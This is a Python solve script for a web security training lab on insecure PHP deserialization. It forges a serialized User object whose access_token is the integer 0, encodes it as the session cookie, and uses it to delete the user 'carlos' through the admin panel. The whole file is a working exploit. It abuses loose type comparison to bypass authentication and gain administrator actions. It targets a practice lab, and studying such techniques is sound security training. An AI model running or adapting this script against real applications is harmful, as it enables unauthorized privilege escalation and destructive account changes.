####################################################################
#
# Lab: Modifying serialized data types
#
# Hack Steps:
#      1. Encode the serialized object after modifying
#      2. Delete carlos from the admin panel with the modified 
#         object as session
#
####################################################################
import requests
from colorama import Fore
import base64

# Change this to your lab URL
LAB_URL = "https://0a1a009303d6c10f8079580700c700c4.web-security-academy.net"

def main():
    print("⦗1⦘ Encoding the serialized object after modifying.. ", end="", flush=True)

    serialized = """O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}"""
    serialized_encoded = base64.b64encode(serialized.encode()).decode()

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Deleting carlos from the admin panel with the modified object as session..", end="", flush=True)

    cookies = { "session": serialized_encoded }
    fetch("/admin/delete?username=carlos", cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")


if __name__ == "__main__":
    main()